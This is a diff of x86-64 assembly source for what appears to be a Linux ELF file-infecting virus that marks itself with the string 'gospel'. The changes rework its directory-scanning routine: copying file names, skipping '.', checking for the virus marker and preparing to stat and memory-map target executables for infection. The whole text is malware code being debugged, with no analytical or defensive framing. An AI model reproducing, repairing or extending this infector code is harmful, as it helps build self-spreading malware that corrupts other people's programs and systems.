@@ -429,7 +429,7 @@ MAP_PRIVATE		equ 0x2
 
 ;ELF header vals
 ELFCLASS64 		equ 0x2
-ETYPE_DYN		equ 0x3
+;ETYPE_DYN		equ 0x3
 ETYPE_EXEC		equ 0x2
 ELFX8664		equ 0x3e
 
@@ -586,11 +586,16 @@ check_file:
 		;mov [fd], rax
 		
 		xor r12, r12
+		mov rsi, rdi
 		lea rdi, [r14 + 200] 
 		mov rsi, [r14 + 160]	
 		;lea rsi, [rcx + r14 + 618]		;linuxdirent.d_nameq
 		.copy_filename:
-			movsb
+			;movsb
+			mov byte al, [rsi]
+			inc rsi
+			mov byte [rdi], al
+			inc rdi
 			inc r12
 			cmp byte [rsi], 0x0
 			jne .copy_filename
@@ -600,7 +605,7 @@ check_file:
 		xor rax, rax
 		push r9
 	check_filename:
-		cmp qword [r14+200], "."
+		cmp word [r14+200], 0x002e
 		je checknext
 		jmp get_vx_name
 	check_vx_name:
@@ -614,14 +619,14 @@ check_file:
 			inc cx
 			inc rdi
 			inc rsi
-			cmp rcx, 7
-			jl .filenameloop
-		jne get_filestat
+			cmp rcx, 5
+			jnz .filenameloop
+		;jne get_filestat
 		jmp checknext
 
 	get_vx_name:
 		call check_vx_name
-		vxname: db "gospel"		
+		vxname: db "gospel",0		
 
 	get_filestat:
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
